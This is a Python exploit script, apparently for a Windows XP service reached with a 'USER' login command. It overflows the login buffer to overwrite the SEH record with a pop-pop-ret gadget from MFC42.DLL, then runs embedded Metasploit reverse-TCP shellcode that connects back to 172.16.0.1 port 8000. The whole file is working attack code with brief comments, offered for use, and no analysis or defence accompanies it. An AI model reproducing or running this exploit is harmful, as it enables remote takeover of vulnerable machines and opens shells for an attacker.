"""
Tested OK against Windows XP [Version 5.1.2600] box

(c) h4lf-jiffie (dohmatob elvis dopgima)
"""

import os
import sys
import struct
import socket

# elvis@hell:~/CODE/XPLOITS$ msfpayload windows/shell_reverse_tcp LHOST=172.16.0.1 LPORT=8000 R | msfencode \
# BufferRegister=ESP -a x86 -b '\x00\x0a\x0d\x40' -t c
# [*] x86/shikata_ga_nai succeeded with size 336 (iteration=1)

reverse_tcp_EGG = (
"\x89\xe7\xb8\xa9\xeb\xa5\xae\x29\xc9\xb1\x4f\x83\xef\xfc\x31"
"\x47\x10\x03\x47\x10\x4b\x1e\x59\x46\x02\xe1\xa2\x97\x74\x6b"
"\x47\xa6\xa6\x0f\x03\x9b\x76\x5b\x41\x10\xfd\x09\x72\xa3\x73"
"\x86\x75\x04\x39\xf0\xb8\x95\x8c\x3c\x16\x55\x8f\xc0\x65\x8a"
"\x6f\xf8\xa5\xdf\x6e\x3d\xdb\x10\x22\x96\x97\x83\xd2\x93\xea"
"\x1f\xd3\x73\x61\x1f\xab\xf6\xb6\xd4\x01\xf8\xe6\x45\x1e\xb2"
"\x1e\xed\x78\x63\x1e\x22\x9b\x5f\x69\x4f\x6f\x2b\x68\x99\xbe"
"\xd4\x5a\xe5\x6c\xeb\x52\xe8\x6d\x2b\x54\x13\x18\x47\xa6\xae"
"\x1a\x9c\xd4\x74\xaf\x01\x7e\xfe\x17\xe2\x7e\xd3\xc1\x61\x8c"
"\x98\x86\x2e\x91\x1f\x4b\x45\xad\x94\x6a\x8a\x27\xee\x48\x0e"
"\x63\xb4\xf1\x17\xc9\x1b\x0e\x47\xb5\xc4\xaa\x03\x54\x10\xcc"
"\x49\x31\xd5\xe2\x71\xc1\x71\x75\x01\xf3\xde\x2d\x8d\xbf\x97"
"\xeb\x4a\xbf\x8d\x4b\xc4\x3e\x2e\xab\xcc\x84\x7a\xfb\x66\x2c"
"\x03\x90\x76\xd1\xd6\x36\x27\x7d\x89\xf6\x97\x3d\x79\x9e\xfd"
"\xb1\xa6\xbe\xfd\x1b\xd1\xf9\x6a\x08\xf2\x05\x6a\x38\xf1\x05"
"\x73\xf8\x7c\xe3\xe1\xe8\x28\xbc\x9d\x91\x70\x36\x3f\x5d\xaf"
"\xde\xdc\xcc\x34\x1e\xaa\xec\xe2\x49\xfb\xc3\xfa\x1f\x11\x7d"
"\x55\x3d\xe8\x1b\x9e\x85\x37\xd8\x21\x04\xb5\x64\x06\x16\x03"
"\x64\x02\x42\xdb\x33\xdc\x3c\x9d\xed\xae\x96\x77\x41\x79\x7e"
"\x01\xa9\xba\xf8\x0e\xe4\x4c\xe4\xbf\x51\x09\x1b\x0f\x36\x9d"
"\x64\x6d\xa6\x62\xbf\x35\xd6\x28\x9d\x1c\x7f\xf5\x74\x1d\xe2"
"\x06\xa3\x62\x1b\x85\x41\x1b\xd8\x95\x20\x1e\xa4\x11\xd9\x52"
"\xb5\xf7\xdd\xc1\xb6\xdd")

if __name__ == '__main__':
    # sanitize command-line
    print "\r\n\t\t-+[ %s by h4lf-jiffie (dohmatob elvis dopgima) ]+-\r\n"%os.path.basename(sys.argv[0])
    if len(sys.argv) < 3:
        print 'Usage: python %s [OPTIONS] <target_IP> <target_PORT>'%(sys.argv[0])
        sys.exit(1)
 
    # set SEH record
    pointer_to_next_SEH_record = 0x04EB4141 # = nop+nop+shortjmp (this will jump to 'london bridge' below)
    SE_handler = 0x5F4111D9 # = address of popr32+popr32+ret in MFC42.DLL (this wll overwrite the existing handler)
    
    # construct 'london bridge' which sets PC to ESP, thus bridging-up with the shikata_ga_nai 
    # decoder in the windows/shell_reverse_tcp shellcode above (reverse_tcp_EGG)
    london_bridge = "\x58"*2 + "\x5C" + "\x58"*4 + "A" # = popr32+popr32+popesp+popr32+popr32+popr32+popr32+nop    

    # sum-up SEH stuff
    seh_gadget = struct.pack('<I', pointer_to_next_SEH_record) 
    seh_gadget += struct.pack('<I', SE_handler)
    seh_gadget += london_bridge 

    # setup socket
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((sys.argv[1], int(sys.argv[2])))

    # build request
    login_req = 'USER '
    login_req += 'U'*(490 - len(login_req)) # alphanum padding
    login_req += 'WXYZ' # gabbage to overwrite EIP and trigger exception
    login_req += 'V'*(574 - len(login_req)) 
    login_req += seh_gadget # pointer to next SEH record is overwritten 574 bytes into the request buffer
    login_req += reverse_tcp_EGG # bring-in payload proper (this egg will use ESP as PC)
    login_req += '\r\n'

    # fuzz (sorry, I meant 'xploit')
    print 'LOGIN REQUEST (%d bytes):'%len(login_req)
    print login_req
    soc.send(login_req)

    # sanity
    soc.close()
